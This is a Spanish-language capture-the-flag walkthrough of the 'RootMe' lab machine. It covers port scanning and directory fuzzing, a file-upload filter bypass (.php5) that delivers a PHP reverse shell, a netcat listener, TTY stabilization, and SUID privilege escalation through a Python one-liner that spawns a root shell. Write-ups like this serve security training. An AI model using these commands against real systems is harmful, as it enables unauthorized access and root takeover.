# RootMe

Conceptos clave: File Upload Bypass, GTFOBins, Gobuster, Netcat, Port scanning, Reconnaissance, Reverse shell, SUID Privilege Escalation, SUID enumeration, TTY stabilization, Web enumeration
Dificultad: Fácil
Fecha: 5 de junio de 2026

## 1. Reconocimiento (Recon)

### Escaneo de puertos y servicios

- **Nmap (full TCP scan + detección básica):**

```bash
nmap -p- --open -T5 -v -n <IP_MAQUINA>
```

### Enumeración web

- **Gobuster (fuzzing de directorios):**

```bash
gobuster dir -u <URL> -w <DICCIONARIO>
```

## 2. Acceso Inicial (Initial Access)

### Vector de ataque

- **Vulnerabilidad:** *Unrestricted File Upload* con validación/filtrado insuficiente de extensiones.

### Explotación

1. Se identifica el panel de subida (p. ej. `/panel`) y la ruta de exposición de ficheros (p. ej. `/uploads`).
2. Se prepara una *reverse shell* en PHP, ajustando **IP** (interfaz `tun0`) y **puerto**.
3. La extensión `.php` es rechazada, por lo que se realiza *bypass* utilizando una variante permitida (p. ej. `.php5`).
4. Una vez subido el fichero, se ejecuta accediendo a la URL del recurso en `/uploads`, obteniendo sesión inversa en el listener.

### Recepción de la shell

- **Listener con Netcat:**

```bash
sudo nc -nlvp 4444
```

### Estabilización de TTY

- **Spawn de pseudo-TTY (Python):**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- **Ajuste de la terminal local (job control + raw mode):**

```bash
# En la shell remota
Ctrl+Z

# En tu terminal local
stty raw -echo
fg

# De vuelta en la shell remota
export TERM=xterm
stty rows <FILAS> cols <COLUMNAS>
```

## 3. Escalada de Privilegios (Privilege Escalation)

### Enumeración

- **Búsqueda de binarios SUID:**

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Explotación

- Se localiza un binario SUID explotable y se eleva a `root` siguiendo una técnica compatible (referencia práctica: **GTFOBins**).
- **Escalada vía Python (ejecución con flag `-p`):**

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

> *Nota:* GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) es una referencia excelente para identificar vectores de escalada mediante binarios con permisos especiales.
> 

## 4. Banderas (Flags)

- **user.txt:** `/var/www/user.txt`
- **root.txt:** `/root/root.txt`